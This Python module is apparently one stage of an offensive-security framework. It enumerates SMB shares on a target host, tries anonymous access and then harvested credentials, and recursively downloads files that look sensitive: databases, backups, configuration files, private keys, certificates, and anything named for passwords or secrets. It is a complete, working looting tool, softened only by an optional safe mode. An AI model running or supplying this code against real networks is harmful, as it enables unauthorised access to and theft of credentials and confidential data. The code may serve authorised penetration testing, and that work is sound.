"""
SMB file looting stage.

Downloads interesting files from accessible SMB shares.
"""

from typing import List

from boxi.adapters.smb import create_adapter as create_smb_adapter
from boxi.artifacts import Credential, FileArtifact, Service
from boxi.logging_config import StageLogger, log_artifact_found, log_stage_skip
from boxi.runtime import require_context


def run_smb_file_looting(target: str) -> List[FileArtifact]:
    """
    Download interesting files from SMB shares.
    
    Args:
        target: Target IP or hostname
        
    Returns:
        List of downloaded file artifacts
    """
    context = require_context()
    
    with StageLogger("smb_loot", target) as stage_log:
        # Find SMB services
        smb_services = _find_smb_services(context)
        
        if not smb_services:
            log_stage_skip("smb_loot", "No SMB services found")
            return []
        
        smb = create_smb_adapter()
        
        if not smb.is_available():
            log_stage_skip("smb_loot", "SMB tools not available")
            return []
        
        # Get valid SMB credentials
        valid_creds = [c for c in context.get_valid_credentials() 
                      if "smb" in c.source.lower()]
        
        all_artifacts = []
        
        for service in smb_services:
            stage_log.info(f"Looting files from {service.target_host}")
            
            # Try anonymous access first
            artifacts = _loot_shares_with_credential(
                smb, service.target_host, None, stage_log
            )
            all_artifacts.extend(artifacts)
            
            # Try with valid credentials
            for cred in valid_creds:
                stage_log.debug(f"Looting with credential {cred.username}")
                
                artifacts = _loot_shares_with_credential(
                    smb, service.target_host, cred, stage_log
                )
                all_artifacts.extend(artifacts)
        
        # Add artifacts to context
        for artifact in all_artifacts:
            context.add_file(artifact)
        
        stage_log.info(f"SMB looting completed, downloaded {len(all_artifacts)} files")
        return all_artifacts


def _find_smb_services(context) -> List[Service]:
    """Find SMB services in discovered services."""
    smb_services = []
    
    # Look for explicit SMB services
    services = context.get_open_services("smb")
    smb_services.extend(services)
    
    # Also check common SMB ports
    all_services = context.get_open_services()
    smb_ports = [139, 445]
    
    for service in all_services:
        if service.port in smb_ports and service not in smb_services:
            smb_services.append(service)
    
    return smb_services


def _loot_shares_with_credential(smb_adapter, host: str, credential: Credential,
                                stage_log: StageLogger) -> List[FileArtifact]:
    """Loot files from SMB shares using a specific credential."""
    artifacts = []
    
    try:
        # Get list of shares
        shares = smb_adapter.list_shares(host, credential)
        
        if not shares:
            return artifacts
        
        cred_info = f"with {credential.username}" if credential else "anonymously"
        stage_log.debug(f"Found {len(shares)} shares on {host} {cred_info}")
        
        # Define interesting file extensions
        interesting_extensions = [
            '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb',  # Databases
            '.sql', '.bak', '.backup',  # SQL and backups
            '.txt', '.log', '.conf', '.config', '.ini',  # Config files
            '.xml', '.json', '.yaml', '.yml',  # Data files
            '.pdf', '.doc', '.docx', '.xls', '.xlsx',  # Documents
            '.zip', '.rar', '.7z', '.tar', '.gz',  # Archives
            '.key', '.pem', '.p12', '.pfx',  # Certificates/keys
        ]
        
        # Loot each accessible share
        for share in shares:
            # Skip obviously dangerous shares in safe mode
            if smb_adapter.settings.safe_mode and share.lower() in ['c$', 'admin$', 'ipc$']:
                stage_log.debug(f"Skipping administrative share {share} (safe mode)")
                continue
            
            stage_log.debug(f"Exploring share: {share}")
            
            # Test read access
            can_read, _ = smb_adapter.test_share_access(host, share, credential)
            
            if not can_read:
                stage_log.debug(f"No read access to share {share}")
                continue
            
            stage_log.info(f"Looting files from share: {share}")
            
            # Get share contents
            contents = smb_adapter.list_share_contents(host, share, credential=credential)
            
            # Download interesting files
            for item in contents:
                if item.get('type') == 'file':
                    filename = item.get('name', '')
                    
                    # Check if file has interesting extension
                    if _is_interesting_file(filename, interesting_extensions):
                        stage_log.info(f"Downloading: {share}\\{filename}")
                        
                        artifact = smb_adapter.download_file(
                            host, share, filename, credential=credential
                        )
                        
                        if artifact:
                            artifacts.append(artifact)
                            log_artifact_found("file", f"SMB {share}\\{filename} ({artifact.size} bytes)")
                        else:
                            stage_log.warning(f"Failed to download {share}\\{filename}")
            
            # Also explore subdirectories (limited depth for safety)
            _explore_subdirectories(
                smb_adapter, host, share, contents, credential, 
                interesting_extensions, artifacts, stage_log, max_depth=2
            )
    
    except Exception as e:
        stage_log.error(f"Error looting SMB shares from {host}: {e}")
    
    return artifacts


def _explore_subdirectories(smb_adapter, host: str, share: str, contents: List[dict],
                           credential: Credential, interesting_extensions: List[str],
                           artifacts: List[FileArtifact], stage_log: StageLogger,
                           max_depth: int = 2, current_depth: int = 0) -> None:
    """Recursively explore subdirectories for interesting files."""
    if current_depth >= max_depth:
        return
    
    # Find directories
    directories = [item for item in contents if item.get('type') == 'directory']
    
    for dir_item in directories:
        dirname = dir_item.get('name', '')
        
        # Skip system directories
        if dirname in ['.', '..', 'System Volume Information', '$RECYCLE.BIN']:
            continue
        
        # Skip common Windows system directories in safe mode
        if smb_adapter.settings.safe_mode:
            skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)', 
                        'ProgramData', 'Users\\Public']
            if any(skip_dir.lower() in dirname.lower() for skip_dir in skip_dirs):
                continue
        
        stage_log.debug(f"Exploring directory: {share}\\{dirname}")
        
        try:
            # Get directory contents
            dir_contents = smb_adapter.list_share_contents(
                host, share, dirname, credential=credential
            )
            
            # Download interesting files from this directory
            for item in dir_contents:
                if item.get('type') == 'file':
                    filename = item.get('name', '')
                    
                    if _is_interesting_file(filename, interesting_extensions):
                        file_path = f"{dirname}\\{filename}"
                        stage_log.info(f"Downloading: {share}\\{file_path}")
                        
                        artifact = smb_adapter.download_file(
                            host, share, file_path, credential=credential
                        )
                        
                        if artifact:
                            artifacts.append(artifact)
                            log_artifact_found("file", f"SMB {share}\\{file_path} ({artifact.size} bytes)")
            
            # Recursively explore subdirectories
            _explore_subdirectories(
                smb_adapter, host, share, dir_contents, credential,
                interesting_extensions, artifacts, stage_log, 
                max_depth, current_depth + 1
            )
        
        except Exception as e:
            stage_log.debug(f"Error exploring directory {dirname}: {e}")


def _is_interesting_file(filename: str, interesting_extensions: List[str]) -> bool:
    """Check if a file is interesting based on its extension."""
    if not filename:
        return False
    
    filename_lower = filename.lower()
    
    # Check extensions
    for ext in interesting_extensions:
        if filename_lower.endswith(ext.lower()):
            return True
    
    # Check for interesting keywords in filename
    interesting_keywords = [
        'password', 'passwd', 'secret', 'credential', 'cred', 'login',
        'user', 'admin', 'config', 'backup', 'database', 'db', 'key',
        'cert', 'private', 'confidential', 'sensitive'
    ]
    
    for keyword in interesting_keywords:
        if keyword in filename_lower:
            return True
    
    return False


def check_stage_requirements() -> bool:
    """Check if this stage can run."""
    smb = create_smb_adapter()
    return smb.is_available()


def get_stage_info() -> dict:
    """Get information about this stage."""
    return {
        "name": "smb_loot",
        "description": "Download interesting files from accessible SMB shares",
        "requirements": ["smbclient or smbmap"],
        "produces": ["FileArtifact"],
        "consumes": ["Service", "Credential"],
        "safe": True,
    }
